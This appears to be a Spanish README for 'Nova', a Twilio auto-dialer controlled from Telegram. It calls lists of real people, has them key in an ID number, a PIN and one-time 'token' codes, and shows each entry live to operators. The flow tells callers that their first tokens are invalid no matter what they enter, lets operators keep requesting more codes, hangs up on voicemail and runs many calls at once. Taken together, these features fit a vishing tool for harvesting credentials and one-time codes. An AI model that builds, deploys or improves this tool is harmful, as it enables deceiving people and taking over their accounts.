# Nova — bot de llamadas con validación desde Telegram

Asistente virtual que **marca automáticamente** a una lista de teléfonos, pide tres
números por voz (terminados en `#`) y **espera que alguien en Telegram los valide**
con botones ✅ / ❌ antes de continuar.

Flujo de una llamada:

```
1. /llamar en Telegram  →  eliges de la lista a cuál número llamar
   (o directo: /llamar +573000000004  →  marca de una vez, sin menú)
2. El usuario escucha el saludo y marca: 109558 #
3. Nova responde y pide el segundo:       32 #
4. La llamada queda en silencio y llega a Telegram el menú FASE 1
5. ✅ Validar Juntos  →  Nova pide el CÓDIGO TOKEN y lo rechaza solo (token inválido)
6. Repite el código token y lo vuelve a rechazar (token inválido)
7. Al tercer intento lo acepta  →  llega el menú FASE 2
8. ✅ Validar Token  →  Nova se despide y cuelga
```

El **código token** se pide `INTENTOS_TERCERO` veces (3 por defecto). **Todos los
intentos se ven en el grupo de Telegram**: los dos primeros como aviso informativo
(*"Código token inválido"*, sin botones, porque el sistema los rechaza solo) y el
tercero como menú **FASE 2** con botones para que el operador decida. En la FASE 2 hay
**tres opciones**: **✅ Validar Token**, **🔁 Pedir otro token** (sigue pidiendo el
código —token4, token5…— y los va escribiendo **abajo** en el mismo panel, sin
reiniciar) y **❌ Invalidar Token**, que dice **"Hubo un error"** y **reinicia el
proceso completo** (vuelve a pedir los tres números). En la FASE 1 se puede usar ✅/❌
para validar los dos primeros datos o 🛑 para colgar.

---

## 1. Requisitos

- Python 3.10 o superior
- Cuenta de **Twilio verificada** (de pago) con número de voz
- **ngrok** para exponer el servidor local (el plan gratis ya incluye un
  **dominio fijo**)
- Un **bot de Telegram** y un grupo

```powershell
pip install flask twilio requests python-dotenv
```

> 🖥️ **¿Quieres dejarlo corriendo 24/7 en un VPS (sin depender de tu PC ni de
> ngrok)?** Sigue la guía **[DESPLIEGUE-VPS.md](DESPLIEGUE-VPS.md)**: incluye un
> instalador automático (`desplegar/instalar.sh`), servicio systemd y HTTPS con
> nginx + Let's Encrypt.
>
> 🌐 **¿Sigues con tu PC pero quieres una URL fija y gratis?** Mira
> **[EJECUCION-NGROK.md](EJECUCION-NGROK.md)**: el plan gratuito de ngrok ya da
> un **dominio fijo** (`...ngrok-free.app`), así que el webhook se registra una
> sola vez y no tienes que tocar nada al reiniciar.
>
> ▶️ **Para arrancarlo cuando quieras:** doble clic en
> [`desplegar/arrancar-nova.bat`](desplegar/arrancar-nova.bat) (túnel + servidor).
> Para pararlo: [`desplegar/parar-nova.bat`](desplegar/parar-nova.bat). Para que
> suba solo al encender el PC: [`desplegar/arranque-automatico.bat`](desplegar/arranque-automatico.bat).

## 2. Configuración

### 2.1 Credenciales

Copia la plantilla y rellena tus datos:

```powershell
copy .env.example .env
```

| Variable | Dónde obtenerla |
|---|---|
| `TWILIO_ACCOUNT_SID` | console.twilio.com → Account Info (empieza por `AC`) |
| `TWILIO_AUTH_TOKEN` | console.twilio.com → Account Info |
| `TWILIO_NUMBER` | Tu número de Twilio, con `+` y clave de país |
| `TELEGRAM_BOT_TOKEN` | Habla con `@BotFather` en Telegram → `/newbot` |
| `TELEGRAM_GROUP_CHAT_ID` | Agrega el bot al grupo y corre `obtener_chat_id.py` (ver abajo) |
| `TELEGRAM_ADMIN_IDS` | *(opcional)* IDs de Telegram con permiso, separados por coma (`@userinfobot`). Vacío = solo los admins del grupo |
| `TELEGRAM_ADMINS_USERNAMES` | *(opcional)* `@nombres` con permiso (menos seguro que los IDs) |
| `TELEGRAM_CHATS_AUTORIZADOS` | *(opcional)* grupos **extra** permitidos; en cualquier otro Nova se sale sola |

**Cómo obtener el `TELEGRAM_GROUP_CHAT_ID`** (número que empieza con `-`):

1. Crea el bot con `@BotFather` (`/newbot`) y copia su token.
2. Agrega el bot a tu grupo de Telegram.
3. Escribe un mensaje dentro del grupo (ej. `/start@TuBot`).
4. Corre el asistente (detecta el id solo y te dice qué pegar en el `.env`):

   ```powershell
   .\.venv\Scripts\python.exe obtener_chat_id.py
   ```

   Salida de ejemplo:

   ```
   Grupos encontrados:
     -1001234567890   ->  Mi Grupo Nova
   Copia el id (CON el signo menos) en tu .env:
       TELEGRAM_GROUP_CHAT_ID=-1001234567890
   ```

   Si todavía no pusiste el token en el `.env`, pásalo como argumento:
   `.\.venv\Scripts\python.exe obtener_chat_id.py 123456:ABC-DEF...`.
   El script también desactiva el webhook temporalmente (si lo había) porque
   `getUpdates` no devuelve nada mientras haya uno activo.

Manual, si lo prefieres: escribe `/start@TuBot` en el grupo y abre
`https://api.telegram.org/bot<TU_TOKEN>/getUpdates`: busca el `chat` de tipo `group`
y copia su `id` (grupos normales `-5...`, supergrupos/canales `-100...`).

> Si el bot sigue sin ver los mensajes que escribes en el grupo, en BotFather usa
> `/setprivacy` → tu bot → **Disable**. Con eso `/llamar` funciona sin el
> `@nombre_del_bot` al final.

### 2.2 Control de acceso (solo administradores)

Nova **solo obedece a administradores** y **solo vive en grupos autorizados**:

- **Solo admins, y solo con comandos.** El 🔒 aparece **únicamente cuando
  intentas usar el bot**: si escribes un comando y no eres admin, Nova responde
  `🔒 <tu nombre>, No puedes usar el bot.` y no ejecuta nada. Un mensaje normal
  (aunque empiece por un número, `hola`, etc.) **se ignora en silencio**, lo
  escriba quien lo escriba. Con los botones es igual: si un no-admin pulsa un
  botón, Nova contesta `🔒 Solo administradores`.
- **Grupos autorizados.** El grupo de `TELEGRAM_GROUP_CHAT_ID` (más los que pongas
  en `TELEGRAM_CHATS_AUTORIZADOS`) son los únicos donde Nova responde. Si alguien
  **agrega a Nova a otro grupo**, se **sale sola** (`leaveChat`).

Quién es "admin" se decide así, en este orden:

1. Si tu id está en `TELEGRAM_ADMIN_IDS` (o tu `@nombre` en
   `TELEGRAM_ADMINS_USERNAMES`) → pasa siempre, sin preguntar nada.
2. Si esas listas están **vacías**, solo pasan los que son **administradores del
   grupo**; Nova lo comprueba con `getChatMember` (y lo **cachea** 5 minutos para
   no preguntar en cada clic).

Sacar tu id es fácil: escríbele a **`@userinfobot`** en Telegram y copia el `Id`.
Para dejarlo en el `.env`:

```env
TELEGRAM_ADMIN_IDS=123456789,987654321
# y/o por @nombre (menos seguro, el @nombre se puede cambiar):
TELEGRAM_ADMINS_USERNAMES=dezuhmontana,mercumbra00
# grupos extra donde también puede estar (además del del .env):
TELEGRAM_CHATS_AUTORIZADOS=-1001234567890
```

> 🔁 Recuerda **volver a registrar el webhook** (`registrar_webhook.py`) tras
> actualizar: Nova necesita recibir el aviso `my_chat_member` para saber que la
> agregaron a un grupo y poder salirse. El script ya lo incluye en
> `allowed_updates`.

Verifícalo con `prueba_solo_admins.py` (no usa red).

### 2.3 Números a llamar

Edita `numeros.txt`, un número por línea, con `+` y clave de país:

```
+573001234567
+573109876543
```

> 🔒 `numeros.txt` contiene **teléfonos de personas reales** y **no** se sube al
> repositorio (está en `.gitignore`). Si empiezas de cero, copia la plantilla
> `numeros.example.txt` a `numeros.txt` y pon ahí tus números.

> En la cuenta de Twilio (verificada / de pago) puedes llamar a **cualquier
> número**. Si usas números internacionales, revisa que el país esté habilitado en
> *Console → Voice → Settings → Geographic Permissions* o la llamada fallará con
> el error de permisos.

## 3. Ejecución

**Terminal 1 — túnel público** (déjalo corriendo):

```powershell
ngrok http --url=https://riptide-slingshot-mandarin.ngrok-free.dev 5000
```

> Usa tu **dev domain** fijo (Dashboard → Domains). Así la URL nunca cambia y el
> webhook se registra una sola vez. Detalle en
> [`EJECUCION-NGROK.md`](EJECUCION-NGROK.md).

**Terminal 2 — servidor**:

```powershell
python servidor.py
```

El servidor usa la URL fija de `WEBHOOK_BASE_URL` (o, si no está, detecta sola la de
ngrok), así que no hay que editarla al reiniciar. Al arrancar imprime:

```
Nova escuchando en http://127.0.0.1:5000  (túnel: https://riptide-slingshot-mandarin.ngrok-free.dev)
Números a marcar: ['+573001234567', '+573109876543']
```

**Terminal 3 — webhook de Telegram** (solo la primera vez, o si cambia el túnel):

El webhook es la URL de *tu* servidor a la que Telegram enviará los mensajes.
La partes así: `<URL-de-ngrok>` + `/telegram/webhook` (esta ruta ya está en el
código). El asistente la registra por ti:

```powershell
.\.venv\Scripts\python.exe registrar_webhook.py
```

Verlo / quitarlo:

```powershell
.\.venv\Scripts\python.exe registrar_webhook.py --info
.\.venv\Scripts\python.exe registrar_webhook.py --borrar
```

> ✅ El plan gratuito de ngrok incluye un **dominio fijo**
> (`riptide-slingshot-mandarin.ngrok-free.dev`, ya configurado). Está fijado en
> `WEBHOOK_BASE_URL`, así que la URL **no cambia** y `registrar_webhook.py` se corre
> **una sola vez** (ver [`EJECUCION-NGROK.md`](EJECUCION-NGROK.md)). Si arrancas
> ngrok sin dominio fijo, la URL cambia en cada reinicio y sí hay que re-registrar.

> 🔧 **Nova lo repara sola al arrancar... y lo vigila después.** Un `setWebhook`
> normal sobre la misma URL contesta *"Webhook is already set"* y **no** borra el
> último error ni reanuda la entrega. Si el servidor estuvo caído, Telegram ya
> recibió un `404`, guardó el error y entró en su propio *backoff*: los mensajes
> se **acumulan** (`pending_update_count`) y el grupo se queda sin respuestas
> aunque el servidor ya esté sano (se ve como *"el bot no arranca"*). Por eso, al
> arrancar, Nova mira `getWebhookInfo` y, si la URL no coincide **o** Telegram
> venía fallando, hace `deleteWebhook` + `setWebhook` y descarta la cola vieja.
> Además, mientras corre, un **vigilante** lo revisa cada `INTERVALO_WEBHOOK`
> segundos (60 por defecto) y lo vuelve a reparar si algo se estropea **después**
> de arrancar (el túnel parpadeó, se perdió la red un momento). Ya no hace falta
> correr `registrar_webhook.py` cada vez. Para revisarlo a mano:
> `registrar_webhook.py --info`.

Equivalente manual con `curl`:

```powershell
curl -X POST "https://api.telegram.org/bot<TU_TOKEN>/setWebhook" -d "url=https://TU-TUNEL.ngrok-free.app/telegram/webhook"
curl "https://api.telegram.org/bot<TU_TOKEN>/getWebhookInfo"
```

## 4. Empezar a usarlo en Telegram

Con el **túnel y el servidor corriendo**, ya solo se usa desde tu grupo:

1. Abre el grupo («#1 Transfer > Nova») en Telegram.
2. Escribe **`/estado`**. Si el bot contesta, ¡está conectado! 🎉
3. **`/agregar +573001234567`** para meter números y **`/llamar`** para elegir a
   cuál llamar (te sale un **menú de botones** con tus números).
4. Durante cada llamada se usa **UN SOLO mensaje** que se va **editando** (no uno por
   número). El panel **solo aparece cuando alguien contesta** la llamada (no mientras
   suena), con el número de destino, la hora de contestación y el botón **🛑 Colgar**.
   Muestra las horas y si sigue en
   llamada o colgó:

   ```
   📞 Llamada · +573001234567
   ✅ Contestó: 10:04 p.m.
   1️⃣ Número 1: 1048068059  ·  10:04 p.m.
   2️⃣ Número 2: 2580  ·  10:05 p.m.
   3️⃣ Código token1: 651278  ·  10:06 p.m.
         Código token2:
         Código token3:

   Estado: 🟢 en llamada
   🟡 esperando tu validación (Fase 2 · código token)
   [✅ Validar Token] [❌ Invalidar Token]
   [🔁 Pedir otro token]
   [🛑 Colgar]
   ```

   El panel es **biestado y claro**: la luz es **verde** mientras la llamada
   vive (`🟢 en llamada`) y **roja** al terminar (`🔴 colgado`,
   con el motivo en la línea de abajo). Los pasos intermedios (Fase 1/2, "token
   inválido", "esperando tu validación"...) van en la línea `nota`, **no** en la
   de estado. La **duración NO se muestra en vivo**: sale **una sola vez**, al
   colgar, como `⏱️ Duró: MM:SS`.

   El panel **no sale mientras la llamada suena**: `initiated`, `queued` y `ringing`
   no mandan nada al grupo. El menú aparece **solo cuando el usuario contesta** (por
   el aviso `in-progress` o al arrancar `/voice/start`), con `✅ Contestó: <hora>` y el
   estado `🟢 en llamada`. Así el grupo no se llena de
   llamadas que nadie contesta.

   El botón **🛑 Colgar** aparece **SIEMPRE** en el panel (también cuando la
   llamada ya figura como `🔴 colgado`). Al pulsarlo, Nova **corta la
   llamada de verdad en Twilio** (`status=completed`) y limpia su estado.

   Cuando el usuario **contesta**, Twilio lo avisa por el `status_callback`
   (`answered` → `in-progress`) y el panel añade una línea con la hora:
   `✅ Contestó: 10:05 p.m.`, con el estado `🟢 en llamada`.

   Los **avisos de estado tardíos o repetidos** de una llamada **ya cerrada**
   (Twilio reenvía `in-progress`/`completed` fuera de orden) se **ignoran**: Nova
   recuerda los `CallSid` resueltos (`resueltas`) y no deja que un aviso tardío
   **vuelva a crear** la ficha. Así nunca aparece un **panel fantasma** con
   `✅ Contestó` y la duración clavada en `00:00` de una llamada que ya terminó.

   Además, el panel **nunca se queda verde por cerrarse mientras se manda**: el
   mensaje del grupo se envía en **segundo plano** (para no demorar la voz) y una
   llamada que **nadie contesta** puede terminar (p. ej. `completed` 0,4 s
   después) justo **mientras el mensaje va en camino**. En ese caso el cierre
   todavía no tenía el mensaje que editar y el panel recién enviado se quedaba en
   `🟢 en llamada` para siempre (bug real de la llamada **`+573000000003`**).
   Ahora el cierre **anota** su estado rojo y el hilo que publica lo **pinta
   sobre el mensaje que acaba de mandar**: el panel de una llamada sin respuesta
   termina **siempre** en `🔴 colgado` (`📴 la llamada terminó (completed)`), y
   las llamadas de esa tanda de la cadena **siguen liberando su hueco**. Igual de
   importante: **nunca se crea una ficha nueva** para un `CallSid` ya cerrado, así
   que un `/voice/start` que se adelante no deja un **panel fantasma** verde.

   La voz entra **casi de corrido**: la cédula y la clave se piden **sin pausa**
   (`PAUSA_INICIO=0.5`: al marcar `#` el `<Gather>` termina al instante y la pregunta
   siguiente suena de una, sin 2 s de silencio). El **token** (`PAUSA=2`) sí conserva su
   pausa, que da tiempo a buscar el código. El **código token
   se pide 3 veces** (`INTENTOS_TERCERO`), así que el panel lleva **una línea por
   intento**: `Código token1`, `Código token2`, `Código token3` (las dos primeras
   se rechazan solas y solo la tercera se valida). Si en la **FASE 2** pulsas
   **🔁 Pedir otro token**, Nova vuelve a pedir el código (con el MISMO aviso **"Token inválido. Reingrese el código."**) y el panel **crece hacia
   abajo**: `Código token4`, `Código token5`… sin tope y sin reiniciar el proceso.
Entre un token y el siguiente hay un silencio (`PAUSA_ENTRE_TOKENS`, 4 s por
   defecto) para que se pida con calma (antes se pedía "de corrido"); `PAUSA_TOKEN`
   es el silencio **después** de pedir el token, para marcar sin cortes. Además, al
   **fallar** un token NO se repite "Ingrese Código token": se deja un momento en
   blanco y la voz dice **"Token inválido. Reingrese el código."**, y **esa misma
   frase sirve de texto para marcar** el siguiente código.

   Lo marcado se lee **en cuanto el usuario deja de teclear**: Twilio espera un
   silencio tras la **última** tecla antes de enviar el número (`timeout` del
   `<Gather>`), y ese conteo **se reinicia con cada tecla** (marcar despacio no
   rompe nada). Antes ese silencio era `15` s (`TIMEOUT_ENTRADA`) y por eso se
   sentía "lentísimo" entre lo que se marcaba y lo que Nova leía: ahora la
   **cédula y la clave** (números cortos) usan el silencio **corto**
   (`TIMEOUT_DIGITOS_CORTO=4`) y el **token** (más largo) usa
   `TIMEOUT_ENTRADA=8`. Además, si se marca **`#`** la lectura es **inmediata**
   (no se espera silencio alguno). Cada `<Gather>` lleva `actionOnEmptyResult`
   para que, si **nadie marca**, Nova **vuelva a pedir** el dato (red de
   seguridad de `MAX_INTENTOS_ENTRADA`) en vez de dejar la llamada muda.

   El **⏱️ cronómetro ya NO se refresca en vivo**: para no llenar el cupo de
   Telegram (~20 mensajes/min por grupo, que con muchas llamadas provocaba `429`) el
   panel es **solo por EVENTOS** (al marcar, contestar, recibir un número, cambiar de
   fase o colgar). La **duración se calcula al colgar** y se muestra **una vez** como
   `⏱️ Duró: MM:SS`, contada desde que alguien **contesta** la llamada: **no se
   reinicia** al recibir los números ni al cambiar de fase (una llamada de 2 minutos
   marca `02:00`). Al colgar, **el mismo mensaje** se actualiza y queda en
   `Estado: 🔴 colgado` con el motivo (p. ej. `📴 la llamada terminó (completed)`).

   **Varias llamadas en simultáneo (aisladas):** cada llamada es
   **completamente independiente** — tiene su **propio panel**, sus **propios
   números** y su **propio estado**, todo indexado por su `CallSid`. Puedes tener 10
   o más llamadas a la vez y cada panel avanza por su cuenta: lo que pase en una
   (colgar, validar, marcar números) **no toca a las demás**. Como ya no hay
   refrescos periódicos, ninguna edición de panel compite con el límite de Telegram.

   Los refrescos del panel se aplican en **orden** (por llamada): como cada
   edición va en su **propio hilo**, dos refrescos seguidos podrían llegar a
   Telegram **en desorden** y una edición vieja borraría los botones recién puestos
   (p. ej. el menú **✅/❌ Validar** de la Fase 1 o 2). Nova marca cada edición con
   un número de secuencia y **descarta las que llegan más viejas** que la última ya
   aplicada, así el panel **siempre** acaba con el menú correcto y nunca se queda
   sin sus botones de validación.

   Si el **aviso de fin de Twilio se pierde** (corte de red, ngrok caído), la
   llamada se cerraría sola por dos vías de seguridad: un **vigilante** local cierra
   las que llevan `TIEMPO_SIN_ACTIVIDAD` segundos **sin dar señales de vida**
   (ni números marcados, ni validaciones, ni el sondeo de la voz), y Twilio corta la
   llamada a los `LIMITE_LLAMADA` segundos. Así **ningún panel se queda "en llamada"
   para siempre con el cronómetro congelado**. Si Telegram responde `429`
   (demasiados mensajes por segundo), Nova **espera y reintenta** el refresco en vez
   de dejar ese panel sin actualizar.

> 🔍 ¿No responde? Corre el diagnóstico: te dice **exactamente** qué falta.
>
> ```powershell
> .\.venv\Scripts\python.exe diagnostico_telegram.py
> ```
>
> ⚠️ Si el bot solo responde cuando lo mencionas, en **@BotFather** →
> `/setprivacy` → tu bot → **Disable**.

## 5. Comandos de Telegram

| Comando | Qué hace |
|---|---|
| `/llamar` | Muestra un menú **paginado** (grupos de 10) para elegir a cuál llamar |
| `/llamar <tel>` | Llama **de una vez** a ese número, sin pasar por el menú (ej. `/llamar +573000000004`) |
| `/ciclos [n]` | **Cadena de llamadas:** mantiene `n` llamadas a la vez (def. 5) y, en cuanto una cuelga, marca la **siguiente** de la lista sin parar |
| `/apagar` | Detiene la cadena (deja de marcar nuevas; **no** cuelga las que están en curso) |
| `/estado` | Muestra si el ciclo está activo y cuántas llamadas hay vivas |
| `/saldo` | Muestra el **saldo restante** de Twilio y lo **gastado** (hoy, este mes y total) |
| `/numeros [pág]` | Muestra la lista **por páginas de 10** (botones ⬅️/➡️ y 📄 para el `.txt` completo) |
| `/agregar <tel>` | Agrega números a la lista (varios separados por espacio) |
| `/quitar <tel>` | Quita números de la lista |
| `/limpiar` | Vacía la lista de números |
| `/historial` | Últimas 5 llamadas registradas, con su estado y quién validó |
| `/reporte <CallSid>` | Historial detallado de una llamada |

> 🔒 **Solo administradores:** si quien escribe un **comando** (o pulsa un botón) no
> es admin, Nova lo ignora con un aviso. Un mensaje que no sea un comando se
> ignora **en silencio** (sin 🔒). Y si el bot está en un grupo que no es el
> autorizado, se **sale sola**. Ver [2.2 Control de acceso](#22-control-de-acceso-solo-administradores).

La lista de números se puede administrar **desde Telegram** sin tocar archivos:

```
/agregar +573001234567 +573109876543
/numeros
/numeros 3
/quitar +573109876543
/limpiar
/llamar +573000000004
```

Con **muchos números** (300+), un solo mensaje de Telegram no cabe: por eso
`/numeros` y el menú de `/llamar` van **en páginas de 10**, con botones
**⬅️ Anterior** / **➡️ Siguiente** (cada página se edita sobre el mismo mensaje,
sin llenar el chat) y un botón **📄 Ver todos (.txt)** que descarga la lista
completa. También puedes pedir una página concreta: `/numeros 12`.

Y si ya sabes a quién llamar, **no hace falta abrir el menú**: escribe el número
con el comando y Nova marca de inmediato:

```
/llamar +573000000004
```

Acepta el teléfono con o sin `+`, y con espacios o guiones (`+57 300 123 4567`);
el bot lo guarda siempre como `+573001234567`. También puedes seguir editando
`numeros.txt` a mano: ambas vías escriben en el mismo archivo.

`GET /salud` devuelve lo mismo en JSON, útil para verificar que el túnel responde.

Con **`/saldo`** consultas en el momento cuánto te queda y cuánto llevas gastado en
Twilio (no hace falta entrar a la consola):

```
💳 Saldo de Twilio
• Disponible: 35.99 USD
• Gastado hoy: 0.02 USD
• Gastado este mes: 14.01 USD
• Gastado en total: 14.01 USD
• Llamadas este mes: 1 (0.8 min)
```

El saldo y el gasto los lee de Twilio (`Balance` y `Usage Records`, categoría
`totalprice` para no contar dos veces). El gasto del **mes** se reinicia el día 1.

## 6. Base de datos

El historial se guarda con SQLAlchemy, así que el motor se cambia **sin tocar el
código**, solo con la variable `NOVA_DB_URL` del `.env`:

| Variable | Motor |
|---|---|
| *(sin definir)* | `sqlite:///nova.db` — archivo local, se crea solo |
| `NOVA_DB_URL=postgresql+psycopg://user:pass@host/nova` | PostgreSQL (Neon, Supabase, local) |
| `NOVA_DB_URL=mysql+pymysql://user:pass@host/nova` | MySQL |

Dos tablas: `llamadas` (una fila por llamada, con su estado) y `eventos` (una fila
por cada dato capturado o decisión, en orden cronológico).

`/reporte` arma el bloque con el formato del reporte del IVR:

```
IVR: Bogota -> ID
Teléfono: +573001234567

Historial:
  • primero: 109558
  • segundo: 32
  ✅ Validado por BamBam
  • tercero: 8443
  • tercero: 9001
  ✅ Validado por BamBam
```

Quien aprueba queda registrado automáticamente: el bot toma el usuario de Telegram
quien apretó el botón, sin pedir nada extra. Los rechazos se guardan en la base de
datos para auditoría, pero no aparecen en el historial del reporte.

## 7. Estructura

| Archivo | Contenido |
|---|---|
| `servidor.py` | Servidor Flask: rutas de voz (TwiML) y webhook de Telegram |
| `config.py` | Lectura de `.env`, textos de voz, tiempos y autodetección de ngrok |
| `bd.py` | Historial de llamadas con SQLAlchemy |
| `.env` | Tus credenciales (**nunca** se sube al repositorio) |
| `numeros.txt` | La lista de teléfonos a marcar (editable a mano o con `/agregar`). **Datos personales: no se sube al repositorio** |
| `numeros.example.txt` | Plantilla de `numeros.txt` con números de ejemplo (esta sí se sube) |
| `obtener_chat_id.py` | Asistente para sacar el `TELEGRAM_GROUP_CHAT_ID` |
| `diagnostico_telegram.py` | Revisa token, webhook y grupo; avisa qué falta para Telegram |
| `diagnostico_twilio.py` | Revisa credenciales, número de origen y destinos verificados |
| `registrar_webhook.py` | Registra/consulta/borra el webhook de Telegram |
| `prueba_webhook_se_arregla_solo.py` | Prueba de que Nova **repara sola** el webhook al arrancar (URL vieja o error 404 acumulado) y de que un **vigilante** lo revisa cada `INTERVALO_WEBHOOK` segundos mientras corre |
| `prueba_flujo_tercero.py` | Prueba local del flujo del tercer número |
| `prueba_flujo_primero_segundo.py` | Prueba local del 1.º y 2.º número (que ambos se pidan con `Gather`) |
| `prueba_comandos_numeros.py` | Prueba local de `/agregar`, `/quitar`, `/limpiar` |
| `prueba_comando_llamar.py` | Prueba local de `/llamar` (menú de botones y llamada al elegido) |
| `prueba_paginas_numeros.py` | Prueba local de las páginas de 10, del `.txt` completo y de `/llamar <tel>` |
| `prueba_panel_sin_perder_botones.py` | Prueba de que el panel NUNCA pierde sus botones por ediciones en desorden (secuencia por llamada) |
| `prueba_panel_sin_cola.py` | Prueba de que el panel **no hace cola** en Telegram: los refrescos pisados se saltan y solo se pinta el ÚLTIMO estado (cada `editMessageText` tarda ~0,6 s) |
| `prueba_reloj_sin_429.py` | Prueba del **presupuesto de mensajes** de Telegram (cubo de fichas): el total de ediciones nunca pasa del límite |
| `prueba_tokens_ilimitados.py` | Prueba local de tokens ilimitados (token4, token5…) y del botón "Pedir otro token" |
| `prueba_comando_saldo.py` | Prueba local del comando `/saldo` (saldo y gasto en Twilio) |
| `prueba_origen_llamadas.py` | Prueba local del origen correcto por destinatario (error 573003) |
| `prueba_reglas_llamada.py` | Prueba de las reglas: "validando datos", invalidar → "Datos incorrectos", token |
| `prueba_buzon_nunca.py` | Prueba de que las llamadas NUNCA llegan al buzón: cuelga al detectar máquina SEGURA (`machine*`/`fax`) y **no** cuelga con AMD dudosa (`unknown`) |
| `prueba_colgar.py` | Prueba del botón 🛑 Colgar (siempre presente) y del aviso "contestó" |
| `prueba_panel_al_contestar.py` | Prueba de que el panel sale SOLO al contestar (no mientras suena) |
| `prueba_panel_nunca_fantasma.py` | Prueba de que una llamada que **nadie contesta** NUNCA queda "en llamada": el cierre se **pinta sobre el panel que aún se estaba publicando** (bug real de `+573000000003`) |
| `prueba_llamadas_independientes.py` | Prueba de que varias llamadas a la vez NO se enredan entre sí (panel, números y estado aislados por CallSid; incluye 5 llamadas simultáneas con hilos, el vigilante de llamadas mudas y el reintento ante el 429 de Telegram) |
| `prueba_cinco_simultaneas.py` | Prueba de **5 llamadas simultáneas de punta a punta**: 5 paneles propios, lo que teclea cada cliente guardado sin fugas, botones que solo afectan a su llamada, rutas de voz sin delay y sin refrescos periódicos (sin 429) |
| `prueba_ciclos.py` | Prueba de la **cadena de llamadas** (`/ciclos`): mantiene el grupo (5) sin marcar de más, marca la siguiente al colgar, recorre TODOS los números, `/apagar` detiene sin colgar las vivas |
| `prueba_solo_admins.py` | Prueba del control de acceso: solo admins pueden usar el bot (y **solo al escribir un comando**: los mensajes normales se ignoran sin 🔒) y solo en grupos autorizados |
| `desplegar/arrancar-nova.bat` | **Doble clic:** levanta el túnel (ngrok) y el servidor |
| `desplegar/parar-nova.bat` | **Doble clic:** detiene servidor y túnel |
| `desplegar/arranque-automatico.bat` | **Doble clic:** arranca Nova solo al encender el PC (`/quitar` lo deshace) |
| `desplegar/instalar.sh` | Instalador para VPS (systemd + nginx + certbot) |
| `desplegar/nova.service` | Servicio systemd (arranque 24/7 y auto-reinicio) |
| `desplegar/nova-ngrok.service` | Servicio systemd para el túnel ngrok (dominio fijo) |
| `desplegar/nginx-nova.conf` | Proxy inverso con HTTPS |
| `desplegar/ngrok.yml` | Plantilla de ngrok con dominio fijo |
| `DESPLIEGUE-VPS.md` | Guía completa para dejar Nova 24/7 en un VPS |
| `EJECUCION-NGROK.md` | Guía para exponerlo gratis con ngrok y dominio fijo |
| `requirements.txt` | Dependencias |
| `README.md` | Esta guía |

### Rutas de voz

| Ruta | Función |
|---|---|
| `POST /voice/start` | Saludo e inicio de la captura |
| `POST /voice/pedir-primero` · `/voice/pedir-segundo` · `/voice/pedir-tercero` | Piden el número con `Gather(finish_on_key='#', timeout=...)`: cédula/clave con el silencio corto y el token con el completo |
| `POST /voice/recibir-primero` · `/recibir-segundo` · `/recibir-tercero` | Guarda el dígito y notifica a Telegram |
| `GET /voice/fase1` · `/voice/fase2` | Espera la decisión de Telegram |
| `POST /voice/estado-llamada` | Twilio avisa aquí cuando la llamada termina (status callback) |
| `POST /voice/amd` | Resultado de la detección de buzón asíncrona (si contesta una máquina, cuelga) |

## 8. Errores frecuentes

**No llega nada a Telegram** — el token está mal escrito o el webhook no está
registrado. Verifica con `getWebhookInfo`. También revisa que `TELEGRAM_GROUP_CHAT_ID`
sea el id del grupo (empieza con `-`) y no el del bot.

**La llamada se corta al colgar** — la URL del túnel cambió. Reinicia `ngrok` y vuelve
a registrar el webhook de Telegram con la URL nueva.

**Twilio devuelve un error 21211 o deCallerId** — estás llamando a un número sin
verificar o sin el prefijo `+` y clave de país.

**Twilio devuelve el error 573002 / 14111 / 21219** (*"The number is not
allowed"* / *"No Twilio phone number is assigned..."*) — el destino no está
permitido. En una cuenta **verificada / de pago** casi siempre es que el número de
**destino no es válido** o el **país no está habilitado** en *Console → Voice →
Settings → Geographic Permissions*. Habilita el país y vuelve a intentar. Si acabas
de pasar de Trial, revisa también tu facturación en *Console → Billing*.

**Twilio devuelve el error 573003** (*"The 'from' number isn't assigned to this
recipient"*) — el número de **origen** (`TWILIO_NUMBER`) no sirve para ese destino.
Nova lo resuelve **solo**:

1. Al arrancar, **aprende del historial** de Twilio qué origen usa cada destino.
2. Al llamar, si Twilio da `573003`, **prueba los demás orígenes** hasta dar con
   el correcto y **lo recuerda** para las próximas veces.

Si algún día aparece un origen que Nova no conozca, agrégalo (por si tienes varios
números de la cuenta):

```ini
TWILIO_ORIGENES=+17372212163,+17370000000
```

**`No se encontro una URL publica`** — `ngrok` no está corriendo en la otra terminal.
Arranca `ngrok http 5000` primero, o pon `WEBHOOK_BASE_URL` en `.env`.

**La llamada cae en buzón de voz** — deja `MAQUINA_DETECCION=Enable` en el
`.env` (por defecto; la cuenta verificada/de pago lo permite). Con esto, si Twilio
**identifica una máquina** la llamada **cuelga de inmediato, sin dejar mensaje**:
nunca llega al buzón (`📵 contestó un buzón — colgada`). Solo se cuelga con
veredictos **seguros**: `machine_start`/`machine_end_*` y `fax`. Nova lo detecta
por tres vías: el aviso `AnsweredBy` que llega al contestar (en `/voice/start`, en
el status callback y en `/voice/amd` con la AMD asíncrona) y, como red de
seguridad, si nadie marca nada tras varios intentos (`MAX_INTENTOS_ENTRADA`).

> ⚠️ **`unknown` NO cuelga (importante).** Cuando la AMD se rinde sin decidir
> devuelve `unknown`, y eso **no es** prueba de buzón: es también el caso típico
> de un **humano que tarda unos segundos** en decir “aló”. Antes Nova colgaba con
> `unknown` y cortaba llamadas reales (bug visto en `+573000000002`: el panel
> mostraba `✅ Contestó` y `📵 contestó un buzón` con `⏱️ Duró: 00:03`, justo el
> `MAQUINA_DETECCION_TIMEOUT`). Ahora un `unknown` **deja seguir la llamada** (el
> panel anota `🟡 Twilio no confirmó que fuera un humano (AMD dudosa)`), el primer
> reintento del dato 1 pregunta **“¿aló?”** para darle el turno, y **si de verdad
> era un buzón** la red de seguridad (`MAX_INTENTOS_ENTRADA`) lo cuelga unos
> segundos después, sin dejar mensaje, con el aviso
> `📵 sin confirmar humano — AMD dudosa, colgada`.

> 💡 La detección de buzón va **asíncrona** (`MAQUINA_DETECCION_ASINCRONA=1`, por
> defecto): Twilio NO retiene la llamada esperando el análisis, así el saludo suena
> de inmediato y el resultado del buzón llega aparte a `/voice/amd`, que cuelga si
> identifica una máquina (`machine*` o `fax`).

> 🛡️ Si con la AMD **asíncrona** vieras que aun así algún buzón se escapa (porque
> el aviso a `/voice/amd` no llega por red/ngrok), pon `MAQUINA_DETECCION_ASINCRONA=0`:
> el veredicto llega en la **misma** petición del TwiML (`/voice/start`), así que el
> corte no depende de un segundo aviso. El precio es que el saludo tarda unos
